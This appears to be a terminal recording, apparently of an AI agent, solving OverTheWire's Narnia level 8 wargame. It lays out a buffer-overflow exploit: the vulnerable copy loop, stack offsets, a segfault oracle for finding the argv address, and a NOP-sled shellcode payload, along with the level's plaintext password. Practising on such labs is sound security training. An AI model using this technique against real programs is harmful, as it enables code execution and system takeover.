{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793497680,"idle_time_limit":2.0,"command":"bash /home/claude/solves/narnia/L8.sh","title":"Narnia L8 -> narnia9: bok[20] copy-loop overflow, argv pointer kept valid, ret into argv sled","env":{"SHELL":"/bin/bash"}}
[0.002, "o", "$ ssh narnia8@narnia.labs.overthewire.org -p 2226   # password aToTvI5BYB\r\n$ cat /narnia/narnia8.c   # char bok[20]; char *blah=b; for(i=0;blah[i];i++) bok[i]=blah[i]\r\n$ objdump: bok at ebp-0x18; bok[20..23] is the local blah pointer, ret at 28\r\n$ the loop overwrites blah at i=20 -> keep argv[20..23] = the argv address\r\n$ find that address with a segfault oracle: argv[28..31]=0x41414141, sweep\r\n$   argv[20..23]; the value that reaches the ret crashes -> 0xffffdf15\r\n$ write /tmp/l8.asm in the shell, nasm, objdump, objcopy -> raw bytes, xxd\r\n$ payload: 20 NOPs + argv + BBBB + ret(argv+32) + NOP sled + shellcode\r\n"]
